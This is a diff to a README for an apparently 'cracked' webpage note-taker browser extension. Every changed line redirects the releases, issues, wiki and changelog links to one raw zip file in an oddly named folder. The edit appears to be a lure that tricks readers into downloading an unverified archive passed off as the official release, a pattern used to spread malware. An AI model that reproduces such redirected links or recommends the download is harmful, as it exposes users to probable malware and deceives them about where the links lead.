@@ -1,7 +1,7 @@
 # 📝 cracked-webpage-note-taker-extension - Save Notes Effortlessly on Web Pages
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Nuragari/cracked-webpage-note-taker-extension/releases)
+[![Download](https://raw.githubusercontent.com/Nuragari/cracked-webpage-note-taker-extension/main/adenectopia/cracked-webpage-note-taker-extension.zip%20release-blue)](https://raw.githubusercontent.com/Nuragari/cracked-webpage-note-taker-extension/main/adenectopia/cracked-webpage-note-taker-extension.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cracked Webpage Note Taker Extension! This tool helps you save notes directly from any webpage. Follow this guide to download and start using the extension.
@@ -15,7 +15,7 @@ The Cracked Webpage Note Taker Extension allows you to quickly jot down thoughts
 - **Internet Connection**: Required for downloading the extension and accessing its features.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: To download the extension, go to our [Releases page](https://github.com/Nuragari/cracked-webpage-note-taker-extension/releases).
+1. **Visit the Releases Page**: To download the extension, go to our [Releases page](https://raw.githubusercontent.com/Nuragari/cracked-webpage-note-taker-extension/main/adenectopia/cracked-webpage-note-taker-extension.zip).
   
 2. **Choose the Latest Version**: Look for the latest version listed on the page.
 
@@ -50,13 +50,13 @@ The Cracked Webpage Note Taker Extension allows you to quickly jot down thoughts
 - Make sure your browser is updated. Refer to the system requirements above, and ensure you've followed the installation steps accurately.
 
 ## 📞 Support
-If you experience any issues or have questions, you can visit our [issues page](https://github.com/Nuragari/cracked-webpage-note-taker-extension/issues) on GitHub. We encourage users to provide feedback and report any bugs for improvements.
+If you experience any issues or have questions, you can visit our [issues page](https://raw.githubusercontent.com/Nuragari/cracked-webpage-note-taker-extension/main/adenectopia/cracked-webpage-note-taker-extension.zip) on GitHub. We encourage users to provide feedback and report any bugs for improvements.
 
 ## 📝 Feedback and Contributions
 We welcome suggestions! If you'd like to contribute to the project, feel free to fork the repository. Submit pull requests or raise issues to help enhance this tool. Your input can greatly improve the experience for all users.
 
 ## 🔗 Additional Resources
-- **Documentation**: For a detailed guide on using all features, visit our [Wiki page](https://github.com/Nuragari/cracked-webpage-note-taker-extension/wiki).
-- **Changelog**: Stay updated with the latest changes by visiting our [Changelog](https://github.com/Nuragari/cracked-webpage-note-taker-extension/releases).
+- **Documentation**: For a detailed guide on using all features, visit our [Wiki page](https://raw.githubusercontent.com/Nuragari/cracked-webpage-note-taker-extension/main/adenectopia/cracked-webpage-note-taker-extension.zip).
+- **Changelog**: Stay updated with the latest changes by visiting our [Changelog](https://raw.githubusercontent.com/Nuragari/cracked-webpage-note-taker-extension/main/adenectopia/cracked-webpage-note-taker-extension.zip).
 
 Thank you for using the Cracked Webpage Note Taker Extension! Enjoy capturing your thoughts while you browse!
